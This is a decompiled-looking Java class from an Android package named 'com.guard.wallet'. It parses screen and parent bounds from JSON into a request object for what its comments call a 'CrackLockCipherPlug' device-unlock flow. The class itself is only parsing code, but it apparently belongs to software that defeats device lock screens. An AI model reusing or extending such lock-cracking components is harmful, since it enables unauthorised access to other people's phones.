package com.guard.wallet.plug;

import com.guard.wallet.core.AppUtils;
import android.graphics.Rect;
import com.google.gson.Gson;
import com.guard.wallet.req.ListenPropResponse;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import java.lang.reflect.Type;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.function.Predicate;

/**
 * Bounds 属性过滤谓词 -- 根据 boundsInScreen / boundsInParent 属性过滤 ListenPropResponse。
 *
 * <p>从 JSON 字符串解析 {@link Rect} 并写入 {@link ReqUnlockDeviceVO} 对应字段。
 * 用于 CrackLockCipherPlug 解锁流程中解析节点边界。
 *
 * <p>vendor 原始路径: com/guard/wallet/plug/a.java
 */
public final class BoundsFilterPredicate implements Predicate<ListenPropResponse> {

    /** 目标解锁设备请求对象，解析后的 Rect 写入此 VO */
    public final ReqUnlockDeviceVO unlockDevice;

    public BoundsFilterPredicate(ReqUnlockDeviceVO unlockDevice) {
        this.unlockDevice = unlockDevice;
    }

    @Override
    public final boolean test(ListenPropResponse response) {
        try {
            boolean isBoundsInScreen = Objects.equals(response.getProp(), "boundsInScreen");
            ReqUnlockDeviceVO req = this.unlockDevice;

            if (isBoundsInScreen) {
                if (AppUtils.B(response.getValue())) {
                    return true;
                }
                CrackLockCipherPlug$CrackRunnable$1$1 typeToken1 = new CrackLockCipherPlug$CrackRunnable$1$1();
                Type type1 = typeToken1.getType();
                Gson gson1 = new Gson();
                Rect result1 = gson1.fromJson(response.getValue(), type1);
                if (result1 == null) {
                    return true;
                }
                req.setBoundsInScreen(result1);
                return true;
            } else if (Objects.equals(response.getProp(), "boundsInParent")) {
                if (AppUtils.B(response.getValue())) {
                    return true;
                }
                CrackLockCipherPlug$CrackRunnable$1$2 typeToken2 = new CrackLockCipherPlug$CrackRunnable$1$2();
                Type type2 = typeToken2.getType();
                Gson gson2 = new Gson();
                Rect result2 = gson2.fromJson(response.getValue(), type2);
                if (result2 == null) {
                    return true;
                }
                req.setBoundsInParent(result2);
                return true;
            } else {
                return false;
            }
        } catch (Exception ex) {
            ConcurrentLinkedQueue queue = CrackLockCipherPlug.responseQueue;
            AppUtils.s("com.guard.wallet.plug.c", ex);
            return true;
        }
    }
}
